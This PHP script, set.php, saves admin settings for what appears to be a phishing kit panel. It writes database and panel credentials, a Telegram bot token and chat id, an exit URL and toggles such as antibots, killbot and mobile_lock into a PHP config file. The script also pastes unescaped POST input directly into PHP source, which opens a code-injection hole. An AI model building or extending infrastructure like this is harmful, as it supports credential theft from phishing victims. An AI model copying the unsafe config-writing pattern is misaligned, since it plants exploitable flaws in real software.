<?php
// set.php — save settings + support AJAX response

require_once 'inc/config.php';
require_once 'inc/connect.php';

date_default_timezone_set('Europe/Dublin');
if (session_status() !== PHP_SESSION_ACTIVE) session_start();

// Auth checks
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    $_SESSION['toast'] = ['type' => 'error', 'msg' => 'You must log in first'];
    header('Location: login.php'); exit;
}
if ($handlers_access != "checked" && (($_SESSION['role'] ?? '') !== "Admin")) {
    $_SESSION['toast'] = ['type' => 'error', 'msg' => 'Access denied'];
    header('Location: settings.php'); exit;
}

/* ------------------- READ POST ------------------- */
$dbhost     = $_POST['dbhost']     ?? $servername;
$dbname     = $_POST['dbname']     ?? $database;
$dbuser     = $_POST['dbuser']     ?? $username;
$dbpass     = $_POST['dbpass']     ?? $password;
$adminuser  = $_POST['adminuser']  ?? $admin_panel_username;
$adminpass  = $_POST['adminpass']  ?? $admin_panel_password;
$extlink    = $_POST['extlink']    ?? $exit_url;
$chatid     = $_POST['chatid']     ?? $telegram_chaid;
$bottoken   = $_POST['bottoken']   ?? $bot_token;

$phonenum   = $_POST['phonenum']   ?? ($phone ?? '');
$address    = $_POST['address']    ?? '';
$onetime    = $_POST['onetime']    ?? '';
$moblock    = $_POST['moblock']    ?? '';
$gateway    = $_POST['gateway']    ?? '';
$antibots   = $_POST['antibots']   ?? '';
$robots     = $_POST['robots']     ?? '';
$killbot    = $_POST['killbot']    ?? '';
$captcha    = $_POST['captcha']    ?? '';
$notify     = $_POST['notify']     ?? '';
$hsettings  = $_POST['hsettings']  ?? '';

/* Normalise checkboxes to your “checked” string */
$address   = ($address  === 'on') ? 'checked' : $address;
$onetime   = ($onetime  === 'on') ? 'checked' : $onetime;
$moblock   = ($moblock  === 'on') ? 'checked' : $moblock;
$gateway   = ($gateway  === 'on') ? 'checked' : $gateway;
$antibots  = ($antibots === 'on') ? 'checked' : $antibots;
$robots    = ($robots   === 'on') ? 'checked' : $robots;
$killbot   = ($killbot  === 'on') ? 'checked' : $killbot;
$captcha   = ($captcha  === 'on') ? 'checked' : $captcha;
$notify    = ($notify   === 'on') ? 'checked' : $notify;
$hsettings = ($hsettings=== 'on') ? 'checked' : $hsettings;

/* ------------------- WRITE CONFIG ------------------- */
$conf = file_get_contents('inc/config.php');

$repls = [
  "servername = '$servername'"                               => "servername = '$dbhost'",
  "database = '$database'"                                   => "database = '$dbname'",
  "username = '$username'"                                   => "username = '$dbuser'",
  "password = '$password'"                                   => "password = '$dbpass'",
  "admin_panel_username = '$admin_panel_username'"           => "admin_panel_username = '$adminuser'",
  "admin_panel_password = '$admin_panel_password'"           => "admin_panel_password = '$adminpass'",
  "exit_url = '$exit_url'"                                   => "exit_url = '$extlink'",
  "telegram_chaid = '$telegram_chaid'"                       => "telegram_chaid = '$chatid'",
  "bot_token = '$bot_token'"                                 => "bot_token = '$bottoken'",
  "phone = '$phone'"                                         => "phone = '$phonenum'",

  "enable_address = '$enable_address'"                       => "enable_address = '$address'",
  "enable_onetime = '$enable_onetime'"                       => "enable_onetime = '$onetime'",
  "mobile_lock = '$mobile_lock'"                             => "mobile_lock = '$moblock'",
  "enable_gateway = '$enable_gateway'"                       => "enable_gateway = '$gateway'",
  "enable_antibots = '$enable_antibots'"                     => "enable_antibots = '$antibots'",
  "enable_robots = '$enable_robots'"                         => "enable_robots = '$robots'",
  "enable_killbot = '$enable_killbot'"                       => "enable_killbot = '$killbot'",
  "enable_captcha = '$enable_captcha'"                       => "enable_captcha = '$captcha'",
  "enable_telegram = '$enable_telegram'"                     => "enable_telegram = '$notify'",
  "handlers_access = '$handlers_access'"                     => "handlers_access = '$hsettings'",
];

$conf_after = strtr($conf, $repls);
file_put_contents('inc/config.php', $conf_after);

/* offline.txt from checkbox_state */
$checkboxState = isset($_POST['checkbox_state']) ? '1' : '0';
file_put_contents('offline.txt', $checkboxState);

/* ------------------- RESPOND ------------------- */
$_SESSION['toast'] = ['type' => 'success', 'msg' => 'Settings saved'];
$_SESSION['update_settings'] = 'success'; // back-compat

// Detect AJAX
$isAjax = (
  (isset($_POST['ajax']) && $_POST['ajax'] === '1') ||
  (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') ||
  (isset($_SERVER['HTTP_ACCEPT']) && stripos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
);

if ($isAjax) {
    header('Content-Type: application/json');
    echo json_encode([
        'status'  => 'success',
        'message' => 'Settings saved',
        // final states back to UI
        'states'  => [
            'checkbox_state' => $checkboxState === '1',
            'gateway'        => ($gateway  === 'checked'),
            'antibots'       => ($antibots === 'checked'),
            'onetime'        => ($onetime  === 'checked'),
            'moblock'        => ($moblock  === 'checked'),
            'notify'         => ($notify   === 'checked'),
        ],
    ]);
    exit;
}

// Non-AJAX: normal redirect
header('Location: settings.php');
exit;
